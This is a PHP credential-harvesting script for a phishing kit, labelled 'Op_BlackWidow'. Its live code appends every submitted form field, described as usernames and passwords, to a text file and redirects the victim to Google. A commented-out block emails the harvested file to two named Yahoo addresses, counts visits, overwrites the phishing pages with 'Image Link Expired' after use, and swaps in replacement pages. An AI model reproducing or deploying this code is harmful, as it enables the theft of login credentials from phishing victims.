<?php

//Op_BlackWidow

// this is to catch username nd password

$handle = fopen("pswrds.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
header("Location: https://google.com");
/* // this is for count section and to expire link
$myFile = "count.txt";
$fh = fopen($myFile, 'r');
$theData = fgets($fh);
fclose($fh);
if ( $theData == 2 ) {
	$myFile = "desktop.htm";
	$anFile = "mobile.htm";
	$odFile = "index.php";

$fh = fopen($myFile, 'w');
$stringData = "Image Link Expired";
fwrite($fh, $stringData);
fclose($fh);

$fh = fopen($anFile, 'w');
$stringData = "Image Link Expired";
fwrite($fh, $stringData);
fclose($fh);

$fh = fopen($odFile, 'w');
$stringData = "Image Link Expired";
fwrite($fh, $stringData);
fclose($fh);
//echo "EXPIRED LINK";
header("Location: https://facebook.com");
exit;

} else {
//to add counter

	$myFile = "count.txt";
$fh = fopen($myFile, 'r');
$theData = fgets($fh);
fclose($fh);
$myFile = "count.txt";
$fh = fopen($myFile, 'w');
$out=(($theData)+1);
fwrite($fh, $out);
fclose($fh);


//mail function
$newFile = "pswrds.txt";
$gh = fopen($newFile, 'r');
$subject=fread($gh, filesize($newFile));
fclose($gh);
$to='jibinpmathew1986@yahoo.com';
$ann='scrapboy000@yahoo.com';
$abt='OpBlackWidow';
mail($to, $abt, $subject,NULL);
mail($ann, $abt, $subject,NULL);
//Targetting second file and renaming

$ycheck = "ym.htm";

if (file_exists($ycheck)) {
    
rename ("mobile.htm","n1.htm");
rename ("desktop.htm","n2.htm");
rename ("desktop_files","dfls");
rename ("ym.htm","mobile.htm");
rename ("ym2.htm","desktop.htm");
rename ("ym_files","desktop_files");

}
header("Location: https://facebook.com");

exit; */
/* } */

?>